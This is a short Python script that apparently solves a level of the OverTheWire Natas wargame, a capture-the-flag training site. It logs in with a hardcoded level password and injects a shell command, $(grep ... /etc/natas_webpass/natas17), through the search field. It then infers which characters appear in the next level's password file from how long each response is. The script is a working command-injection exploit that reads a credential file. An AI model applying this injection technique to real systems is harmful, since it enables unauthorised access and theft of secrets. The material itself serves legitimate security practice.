import requests
import re

username = 'natas16'
password = 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'

letras = str()
characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

for c in range(len(characters)):
    url =r"http://natas16.natas.labs.overthewire.org/index.php?needle=%24%28grep+{}+%2Fetc%2Fnatas_webpass%2Fnatas17%29a&submit=Search".format(characters[c])
    print(url)
    response = requests.get(url=url,auth=(username,password))
    if len(response.text) < 10000:
        letras += characters[c]
        print(characters[c])
print(letras)
